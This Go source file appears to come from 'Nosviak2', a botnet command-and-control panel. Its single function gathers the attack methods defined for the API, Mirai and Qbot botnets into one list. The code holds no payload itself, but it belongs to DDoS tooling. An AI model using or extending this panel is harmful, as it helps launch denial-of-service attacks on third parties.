package attacks

import "Nosviak2/core/sources/layouts/json"

//access all of the methods inside the cnc
//this will ensure its done without any errors happening
func AllMethods(src []*Method) []*Method { //returns an array of methods properly
	//ranges through all api methods first
	//this will ensure they are all methods properly
	for name, val := range json.AttacksJson { //ranges through
		//querys the method properly without issues happening
		src = append(src, QueryMethod(name)); _ = val
	}

	//ranges through all mirai methods
	//this will ensure they are all registered properly
	for name, val := range json.MiraiAttacksJson { //ranges through
		//querys the method properly without issues happening
		src = append(src, QueryMethod(name)); _ = val
	}

	//ranges through all mirai methods
	//this will ensure they are all registered properly
	for name, val := range json.QbotAttacksJson { //ranges through
		//querys the method properly without issues happening
		src = append(src, QueryMethod(name)); _ = val
	}

	return src
}